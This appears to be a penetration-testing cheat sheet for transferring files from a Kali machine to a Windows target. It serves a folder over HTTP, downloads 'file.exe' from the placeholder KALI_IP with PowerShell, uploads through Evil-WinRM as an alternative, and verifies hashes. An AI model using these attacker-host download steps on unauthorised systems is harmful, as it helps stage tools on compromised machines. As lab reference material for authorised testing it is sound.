## 1. Kali — from the folder containing the file

**Kali**

```bash
python3 -m http.server 8000
```

Keep the server running; serve only the intended transfer folder.

## 2. Windows — save the file

**Windows PowerShell**

```powershell
Invoke-WebRequest -UseBasicParsing 'http://KALI_IP:8000/file.exe' -OutFile 'C:\Users\Public\file.exe'
```

## Alternative — if already in Evil-WinRM

**Evil-WinRM prompt**

```bash
upload ./file.exe C:\Users\Public\file.exe
```

## Download a served file from Kali to Windows

**Run in:** Windows PowerShell. **Requires:** Kali is serving the intended directory with python3 -m http.server 8000; Windows can reach that address and write the destination.

```powershell
Invoke-WebRequest -UseBasicParsing 'http://KALI_IP:8000/file.bin' -OutFile 'C:\Users\Public\file.bin'
Get-FileHash 'C:\Users\Public\file.bin' -Algorithm SHA256
```

**What the result establishes:** Confirm the downloaded object is the intended file rather than an HTML error/login page, then compare its hash.

**Next check:** Check the requested URL and server log, then compare the hash to the original before using the file.

## If it fails

| Symptom | Check |
| --- | --- |
| The result is empty or contains an HTML error page | PowerShell and curl.exe are different clients; quoting, TLS trust, proxy configuration and the current working directory can change the result. |
